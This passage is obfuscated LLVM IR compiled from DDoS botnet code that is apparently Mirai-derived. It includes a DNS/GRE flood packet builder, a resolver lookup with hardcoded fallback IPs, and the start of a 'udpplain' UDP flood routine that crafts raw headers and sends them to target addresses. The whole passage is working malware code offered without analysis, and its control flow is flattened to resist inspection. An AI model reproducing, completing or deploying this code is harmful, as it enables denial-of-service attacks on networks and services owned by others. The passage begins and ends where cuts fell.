; <label>:245:                                    ; preds = %loopEntry
  store i32 1748167224, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i32, i32* %23, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %23, align 4
  store i32 -1597923949, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8, i8* %24, align 1
  %251 = load i8*, i8** %30, align 8
  store i8 %250, i8* %251, align 1
  %252 = load i8*, i8** %29, align 8
  %253 = load i32, i32* %21, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds i8, i8* %252, i64 %254
  %256 = getelementptr inbounds i8, i8* %255, i64 2
  %257 = bitcast i8* %256 to %struct.grehdr*
  store %struct.grehdr* %257, %struct.grehdr** %31, align 8
  %258 = call zeroext i16 @htons(i16 zeroext 1) #7
  %259 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %260 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %259, i32 0, i32 0
  store i16 %258, i16* %260, align 2
  %261 = call zeroext i16 @htons(i16 zeroext 1) #7
  %262 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %263 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %262, i32 0, i32 1
  store i16 %261, i16* %263, align 2
  store i32 -933038020, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = add nsw i32 %265, 1
  store i32 %266, i32* %9, align 4
  store i32 1574240242, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 2116424218, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1336984126, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i32, i32* %9, align 4
  %271 = load i8, i8* %5, align 1
  %272 = zext i8 %271 to i32
  %273 = icmp slt i32 %270, %272
  %274 = select i1 %273, i32 142061095, i32 1810750079
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8**, i8*** %11, align 8
  %277 = load i32, i32* %9, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8*, i8** %276, i64 %278
  %280 = load i8*, i8** %279, align 8
  store i8* %280, i8** %32, align 8
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to %struct.iphdr*
  store %struct.iphdr* %282, %struct.iphdr** %33, align 8
  %283 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i64 1
  %285 = bitcast %struct.iphdr* %284 to %struct.udphdr*
  store %struct.udphdr* %285, %struct.udphdr** %34, align 8
  %286 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i64 1
  %288 = bitcast %struct.udphdr* %287 to %struct.dnshdr*
  store %struct.dnshdr* %288, %struct.dnshdr** %35, align 8
  %289 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %290 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %289, i64 1
  %291 = bitcast %struct.dnshdr* %290 to i8*
  %292 = getelementptr inbounds i8, i8* %291, i64 1
  store i8* %292, i8** %36, align 8
  %293 = load i16, i16* %13, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp eq i32 %294, 65535
  %296 = select i1 %295, i32 -1642123844, i32 -151829328
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = call i32 @rand_next()
  %299 = and i32 %298, 65535
  %300 = trunc i32 %299 to i16
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 3
  store i16 %300, i16* %302, align 4
  store i32 -151829328, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i16, i16* %16, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %305, 65535
  %307 = select i1 %306, i32 -1738839121, i32 -1579130577
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 0
  store i16 %311, i16* %313, align 2
  store i32 -1579130577, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i16, i16* %17, align 2
  %316 = zext i16 %315 to i32
  %317 = icmp eq i32 %316, 65535
  %318 = select i1 %317, i32 1691383893, i32 -543827926
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = call i32 @rand_next()
  %321 = and i32 %320, 65535
  %322 = trunc i32 %321 to i16
  %323 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  store i32 -543827926, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i16, i16* %18, align 2
  %327 = zext i16 %326 to i32
  %328 = icmp eq i32 %327, 65535
  %329 = select i1 %328, i32 -1237232935, i32 -1745681535
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = call i32 @rand_next()
  %332 = and i32 %331, 65535
  %333 = trunc i32 %332 to i16
  %334 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %335 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %334, i32 0, i32 0
  store i16 %333, i16* %335, align 2
  store i32 -1745681535, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i8*, i8** %36, align 8
  %338 = load i8, i8* %19, align 1
  %339 = zext i8 %338 to i32
  call void @rand_alpha_str(i8* %337, i32 %339)
  %340 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 7
  store i16 0, i16* %341, align 2
  %342 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %343 = bitcast %struct.iphdr* %342 to i16*
  %344 = call zeroext i16 @checksum_generic(i16* %343, i32 20)
  %345 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 7
  store i16 %344, i16* %346, align 2
  %347 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 3
  store i16 0, i16* %348, align 2
  %349 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %351 = bitcast %struct.udphdr* %350 to i8*
  %352 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 2
  %354 = load i16, i16* %353, align 2
  %355 = load i8, i8* %19, align 1
  %356 = zext i8 %355 to i64
  %357 = add i64 21, %356
  %358 = add i64 %357, 2
  %359 = load i32, i32* %21, align 4
  %360 = sext i32 %359 to i64
  %361 = add i64 %358, %360
  %362 = add i64 %361, 4
  %363 = trunc i64 %362 to i32
  %364 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %349, i8* %351, i16 zeroext %354, i32 %363)
  %365 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %366 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %365, i32 0, i32 3
  store i16 %364, i16* %366, align 2
  %367 = load i32, i32* %22, align 4
  %368 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 0
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %372, i32 0, i32 2
  %374 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %373, i32 0, i32 0
  store i32 %367, i32* %374, align 4
  %375 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %376 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %375, i32 0, i32 1
  %377 = load i16, i16* %376, align 2
  %378 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 0
  %383 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %382, i32 0, i32 1
  store i16 %377, i16* %383, align 2
  %384 = load i32, i32* %10, align 4
  %385 = load i8*, i8** %32, align 8
  %386 = load i8, i8* %19, align 1
  %387 = zext i8 %386 to i64
  %388 = add i64 41, %387
  %389 = add i64 %388, 2
  %390 = load i32, i32* %21, align 4
  %391 = sext i32 %390 to i64
  %392 = add i64 %389, %391
  %393 = add i64 %392, 4
  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %396 = load i32, i32* %9, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i64 @sendto(i32 %384, i8* %385, i64 %393, i32 16384, %struct.sockaddr* %402, i32 16)
  store i32 1391390922, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i32, i32* %9, align 4
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %9, align 4
  store i32 -1336984126, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  store i32 2116424218, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %407, %404, %336, %330, %325, %319, %314, %308, %303, %297, %275, %269, %268, %267, %264, %249, %246, %245, %242, %232, %223, %218, %165, %161, %105, %99, %98, %95, %89, %88, %82, %81, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %.reg2mem8 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1667540737, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 1667540737, label %first
    i32 588345821, label %16
    i32 202335563, label %30
    i32 -813132568, label %32
    i32 -1169847973, label %37
    i32 -844340107, label %45
    i32 -1949955082, label %50
    i32 148277560, label %55
    i32 1267133267, label %56
    i32 -2009754699, label %57
    i32 1434815519, label %58
    i32 2057231233, label %63
    i32 666359707, label %68
    i32 1875459197, label %73
    i32 1403800894, label %79
    i32 2103757814, label %93
    i32 -464583327, label %94
    i32 -621708967, label %97
    i32 -1194952753, label %101
    i32 -1752264713, label %104
    i32 1021689305, label %105
    i32 260299067, label %106
    i32 916524941, label %NodeBlock5
    i32 466645581, label %NodeBlock3
    i32 -418977483, label %LeafBlock1
    i32 797691334, label %NodeBlock
    i32 704830884, label %LeafBlock
    i32 1114028226, label %114
    i32 924227791, label %116
    i32 1848160159, label %118
    i32 -2053570213, label %120
    i32 -1200847353, label %NewDefault
    i32 720010977, label %122
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sge i32 %.reload, 0
  %15 = select i1 %14, i32 588345821, i32 260299067
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %19 = call i64 @read(i32 %17, i8* %18, i64 2048)
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @close(i32 %21)
  call void @table_unlock_val(i8 zeroext 22)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %24 = load i32, i32* %3, align 4
  %25 = call i8* @table_retrieve_val(i32 22, i32* null)
  %26 = call i32 @util_stristr(i8* %23, i32 %24, i8* %25)
  store i32 %26, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, -1
  %29 = select i1 %28, i32 202335563, i32 1021689305
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %6, align 4
  store i32 -813132568, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp slt i32 %33, %34
  %36 = select i1 %35, i32 -1169847973, i32 -621708967
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  store i8 %41, i8* %10, align 1
  %42 = load i8, i8* %8, align 1
  %43 = icmp ne i8 %42, 0
  %44 = select i1 %43, i32 1434815519, i32 -844340107
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 148277560, i32 -1949955082
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8, i8* %10, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 9
  %54 = select i1 %53, i32 148277560, i32 1267133267
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 -464583327, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i8 1, i8* %8, align 1
  store i32 -2009754699, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1434815519, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %10, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp ne i32 %60, 46
  %62 = select i1 %61, i32 2057231233, i32 1875459197
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %10, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp slt i32 %65, 48
  %67 = select i1 %66, i32 1403800894, i32 666359707
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %10, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp sgt i32 %70, 57
  %72 = select i1 %71, i32 1403800894, i32 1875459197
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %3, align 4
  %76 = sub nsw i32 %75, 1
  %77 = icmp eq i32 %74, %76
  %78 = select i1 %77, i32 1403800894, i32 2103757814
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %81 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %82 = load i32, i32* %4, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i32, i32* %6, align 4
  %86 = load i32, i32* %4, align 4
  %87 = sub nsw i32 %85, %86
  call void @util_memcpy(i8* %80, i8* %84, i32 %87)
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %4, align 4
  %90 = sub nsw i32 %88, %89
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  store i8 1, i8* %9, align 1
  store i32 -621708967, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -464583327, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %6, align 4
  store i32 -813132568, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  %100 = select i1 %99, i32 -1194952753, i32 -1752264713
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  store i32 720010977, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 1021689305, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 260299067, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  store i32 %108, i32* %.reg2mem8
  store i32 916524941, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem8
  %Pivot6 = icmp slt i32 %.reload13, 2
  %109 = select i1 %Pivot6, i32 797691334, i32 466645581
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem8
  %Pivot4 = icmp slt i32 %.reload10, 3
  %110 = select i1 %Pivot4, i32 1848160159, i32 -418977483
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf2 = icmp eq i32 %.reload9, 3
  %111 = select i1 %SwitchLeaf2, i32 -2053570213, i32 -1200847353
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem8
  %Pivot = icmp slt i32 %.reload12, 1
  %112 = select i1 %Pivot, i32 704830884, i32 924227791
  store i32 %112, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf = icmp eq i32 %.reload11, 0
  %113 = select i1 %SwitchLeaf, i32 1114028226, i32 -1200847353
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = call i32 @htonl(i32 134744072) #7
  store i32 %115, i32* %1, align 4
  store i32 720010977, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @htonl(i32 1246898730) #7
  store i32 %117, i32* %1, align 4
  store i32 720010977, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @htonl(i32 1074151430) #7
  store i32 %119, i32* %1, align 4
  store i32 720010977, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = call i32 @htonl(i32 67240450) #7
  store i32 %121, i32* %1, align 4
  store i32 720010977, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 720010977, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %1, align 4
  ret i32 %123

loopEnd:                                          ; preds = %NewDefault, %120, %118, %116, %114, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %106, %105, %104, %101, %97, %94, %93, %79, %73, %68, %63, %58, %57, %56, %55, %50, %45, %37, %32, %30, %16, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -298046349, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -298046349, label %first
    i32 841364765, label %52
    i32 1663712668, label %55
    i32 -1229277292, label %58
    i32 -744817425, label %59
    i32 -1478270315, label %65
    i32 824210464, label %75
    i32 -1685807358, label %84
    i32 -1899656396, label %93
    i32 1051229681, label %101
    i32 936731051, label %102
    i32 -455398101, label %120
    i32 -840961744, label %121
    i32 -1621336561, label %131
    i32 -449932006, label %157
    i32 516593212, label %175
    i32 1933135807, label %176
    i32 -1771727602, label %177
    i32 -681441654, label %180
    i32 784006158, label %181
    i32 -2138393546, label %182
    i32 1352895329, label %188
    i32 1024500314, label %197
    i32 -17429451, label %201
    i32 215208490, label %211
    i32 195655257, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 841364765, i32 1663712668
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 -1229277292, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  store i32 -1229277292, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -744817425, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 -1478270315, i32 -681441654
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 824210464, i32 -1685807358
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 -1899656396, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #7
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 -1899656396, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 1051229681, i32 936731051
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
